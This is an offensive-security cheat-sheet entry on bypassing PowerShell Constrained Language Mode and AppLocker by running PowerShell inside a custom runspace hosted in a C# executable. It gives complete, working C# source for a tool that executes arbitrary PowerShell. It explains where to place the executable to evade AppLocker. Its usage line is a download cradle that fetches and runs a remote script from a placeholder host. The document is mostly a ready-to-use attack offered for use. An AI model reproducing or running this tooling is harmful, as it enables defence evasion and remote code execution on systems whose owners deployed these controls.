# 16.09 CLM Bypass C# Runspace PowerPick technique

> Create a custom PowerShell Runspace from C# (PowerPick) — custom runspaces default to FullLanguage regardless of CLM/AppLocker.

## Overview

ConstrainedLanguage Mode restricts .NET type access and Add-Type. Bypass by creating a PowerShell Runspace from a C# executable — custom runspaces default to FullLanguage mode regardless of AppLocker/CLM settings.

## Steps

- Create Console App (.NET Framework) referencing System.Management.Automation.dll.
- **RunspaceFactory.CreateRunspace()** — creates FullLanguage runspace.
- **PowerShell.Create(); ps.Runspace = runspace** — bind PS object to runspace.
- **ps.AddScript(args); ps.Invoke()** — execute arbitrary PS in FullLanguage.
- Copy CLMBypass.exe to **C:\Windows\Tasks** to also bypass AppLocker.

## Commands

### CLMBypass.cs — Runspace technique

```csharp
using System;
using System.Collections.ObjectModel;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
// Reference: C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Management.Automation\...
static void Main(string[] args)
{
    if (args.Length == 0) return;
    // Create and open FullLanguage runspace
    Runspace runspace = RunspaceFactory.CreateRunspace();
    runspace.Open();
    // Create PowerShell object bound to our runspace
    PowerShell ps = PowerShell.Create();
    ps.Runspace = runspace;
    // Execute the command passed as argument
    ps.AddScript(String.Join(" ", args));
    Collection<PSObject> results = ps.Invoke();
    foreach (PSObject obj in results)
        Console.WriteLine(obj.ToString());
    runspace.Close();
}
```

### Usage (from C:\Windows\Tasks for AppLocker bypass)

```powershell
# Copy to AppLocker-allowed path first:
Copy-Item CLMBypass.exe C:\Windows\Tasks\
# Execute PS commands in FullLanguage:
C:\Windows\Tasks\CLMBypass.exe "IEX (New-Object Net.WebClient).DownloadString('http://<IP>/Invoke-Seatbelt.ps1'); Invoke-Seatbelt -group=system"
# Verify language mode in custom runspace is FullLanguage (not ConstrainedLanguage)
```
